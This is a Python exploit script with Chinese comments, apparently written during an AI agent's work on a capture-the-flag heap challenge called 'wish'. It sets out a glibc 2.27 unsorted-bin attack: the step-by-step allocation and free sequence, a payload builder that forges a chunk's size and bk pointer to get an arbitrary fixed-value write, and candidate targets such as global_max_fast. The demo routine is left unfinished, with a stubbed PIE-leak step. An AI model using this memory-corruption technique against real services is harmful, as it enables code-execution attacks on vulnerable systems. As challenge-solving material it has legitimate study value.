# wish — clean unsorted-bin attack 原语 (crash-free 固定值写)
# 来源: agent-1770c5f4, BREAKTHROUGH 报告 + 本地 ht3 实验验证 (transcript L27851:
#       "houses[9]: 0x0 -> 0x7fffff3c9ca0 == libc+0x3ebca0, process ALIVE")
# 状态: 原语本地验证通过; 但利用链未完成 (写值固定为 libc+0x3ebca0, 无法直接当函数指针)
# 原理: glibc 2.27 _int_malloc unsorted 循环的 "exact fit" 分支在 unlink 写
#       bck->fd = unsorted_chunks(av) 之后立即 return (汇编 0x94629/0x9462d -> je 0x948d0),
#       跳过循环继续前的 victim->size 合法性检查 => 伪造 bk 不触发 abort。
# 操作序列 (完整 6 预算内可完成):
#   1. money: choice2 (rand()%600) 刷到 >=500 后 choice9(500) 才可用
#   2. opt3(0x88)  -> A @ house0   (forge 源)
#   3. opt3(0x4f8) -> B @ house1   (0x500 chunk)
#   4. opt3(0x88)  -> C @ house2   (guard, 防 top 合并)
#   5. opt5(house1): free(B); 程序附加 calloc(1,0x20) 从 B 头部切走 0x30,
#      余量 R(0x4d0) 落入 unsorted bin, 且 last_remainder=R (ht3 实测)
#   6. opt9(house0, 500, payload): A_user 与 R 之间偏移 0xa8 (A chunk 0x90 + orphan 0x30),
#      payload = b'A'*0x98 + p64(0x4d1) + p64(0) + p64(T-0x10)
#      即伪写 R+0x10(size=0x4d1|PREV_INUSE), R+0x18(bk = T-0x10); R+0x10(fd) 可留 0
#   7. opt3(0x4c0): nb=0x4d0 == R 伪造 size 的 exact fit -> *T = libc+0x3ebca0, 进程存活
# 目标 T 候选 (见 SOLVE.md 失败路线): __free_hook/__malloc_hook/one_gadget 距离均不可达;
#       global_max_fast(libc+0x3ed940) 是唯一被论证可行且有后续的落点。

import sys
sys.path.insert(0, __file__.rsplit('/', 1)[0])
from wlib import Wish, leak_libc

ORPHAN_SZ = 0x30            # choice5 附加 calloc(1,0x20) 的 chunk 大小
R_SZ = 0x4d0                # 0x500 - 0x30 的 unsorted 余量
OFF_A_TO_R = 0x90 + ORPHAN_SZ - 0x10  # A_user 到 R chunk 头 = 0xa8


def build_forge(target):
    """返回 choice9(500) 的 payload: 伪造 R 的 size/bk"""
    pay = b'A' * (OFF_A_TO_R - 0x10)          # A_user 到 R-0x10 (R 的 prev_size 处)
    pay += p64(R_SZ | 1)                       # R+0x00? 不 —— 修正: R chunk 头在 A_user+0xa8
    # 上面两行示意; 精确定位: payload 偏移 0xa8 = R.prev_size, 0xb0 = R.size, 0xb8 = R.fd, 0xc0 = R.bk
    pay = b'A' * 0xa8
    pay += p64(0) + p64(R_SZ | 1)              # prev_size, size
    pay += p64(0) + p64(target - 0x10)         # fd, bk = T-0x10
    assert len(pay) <= 500
    return pay


def demo_local(target_name='houses_probe'):
    """本地演示: 把 libc+0x3ebca0 写进 houses[9] (transcript 原验证点)。"""
    w = Wish()
    base, s18, s28 = leak_libc(w)
    print('libc base = %#x' % base)
    # 1) money 彩票: choice2 直到 >= 500 (每次 rand()%600, ~91% 成功率)
    for _ in range(12):
        w.p.sendline(b'2')
        w.wait()
    # (真实对局应解析 choice2 回显里的 lucky number 判断 money; 演示从略)
    w.opt3(0x88, b'A' * 8)                     # house0 = A
    w.opt3(0x4f8, b'B' * 8)                    # house1 = B
    w.opt3(0x88, b'C' * 8)                     # house2 = C (guard)
    w.opt5(1)                                  # free(B) -> orphan split -> R@unsorted
    # forge: 需先知道 houses[] 绝对地址才能选 libc 内目标; transcript 用 /proc/pid/mem 读 heap base
    # 演示目标 = houses[9] (PIE+0x2030a8):
    #   pie = s30 - 0x1c20 (slot+0x30 从 print1 解出)
    a, _ = w.opt7(b'A' * 0x30, b'B')           # 再 leak 一次拿 PIE
    pie = None
    for line in a.split(b'\n'):
        pass
    print('demo: 需要实现 PIE 泄露解析后继续, 见 transcript L27544-27851; 此处仅存档操作序列')
    w.p.close()


if __name__ == '__main__':
    demo_local()
